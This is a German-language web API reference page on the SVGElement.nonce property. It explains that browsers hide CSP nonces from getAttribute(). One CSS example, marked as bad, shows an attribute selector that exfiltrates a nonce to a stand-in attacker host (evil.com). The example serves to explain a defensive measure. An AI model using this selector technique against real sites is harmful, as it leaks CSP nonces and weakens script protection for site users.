---
title: "SVGElement: nonce-Eigenschaft"
short-title: nonce
slug: Web/API/SVGElement/nonce
l10n:
  sourceCommit: e9b6cd1b7fa8612257b72b2a85a96dd7d45c0200
---

{{APIRef("SVG")}}

Die **`nonce`**-Eigenschaft des [`SVGElement`](/de/docs/Web/API/SVGElement)-Interfaces gibt den Nonce zurück, der von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf durchgeführt werden darf.

## Wert

Ein String; der kryptografische Nonce oder ein leerer String, wenn kein Nonce gesetzt ist.

## Beispiele

### Abrufen eines Nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce`-IDL-Attribut, daher war es notwendig, einen Workaround wie [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback zu verwenden:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

Allerdings verbergen neuere Browserversionen `nonce`-Werte, die auf diese Weise abgerufen werden (ein leerer String wird zurückgegeben). Die IDL-Eigenschaft (`svg['nonce']`) wird die einzige Möglichkeit sein, Nonces zuzugreifen.

Das Verbergen von Nonces hilft zu verhindern, dass Angreifer Nonce-Daten über Mechanismen exfiltrieren, die Daten von Inhaltsattributen abrufen können, wie in diesem CSS-Selektor:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce), eine ähnliche Methode für HTML-Elemente.
- [`nonce` globales Attribut](/de/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
